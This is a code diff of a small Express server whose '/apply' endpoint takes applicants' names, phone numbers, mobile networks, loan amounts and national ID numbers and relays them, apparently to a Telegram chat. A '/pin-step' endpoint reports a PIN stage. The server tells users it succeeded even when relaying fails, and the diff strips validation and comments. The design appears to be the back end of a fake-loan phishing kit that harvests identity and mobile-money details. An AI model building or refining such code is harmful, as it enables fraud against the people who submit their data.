@@ -18,13 +18,9 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// ✅ STORE + SEND APPLICATION DATA
+// APPLICATION
 app.post("/apply", async (req, res) => {
   const { name, phone, network, amount, nationalId } = req.body;
-
-  if (!name || !phone || !network || !amount || !nationalId) {
-    return res.status(400).send("Missing data");
-  }
 
   const message = `
 📥 NEW LOAN APPLICATION
@@ -42,16 +38,15 @@ app.post("/apply", async (req, res) => {
       text: message,
     });
 
-    // ✅ Send success response
     res.json({ success: true });
 
   } catch (error) {
-    console.error("Telegram Error:", error.message);
-    res.json({ success: true }); // still continue
+    console.error(error.message);
+    res.json({ success: true });
   }
 });
 
-// ✅ OPTIONAL: PIN STEP NOTIFICATION (NO PIN)
+// PIN STEP
 app.post("/pin-step", async (req, res) => {
   const { phone } = req.body;
 
@@ -75,7 +70,7 @@ app.post("/pin-step", async (req, res) => {
   }
 });
 
-// Start server
+// START SERVER
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Server running on port ${PORT}`);
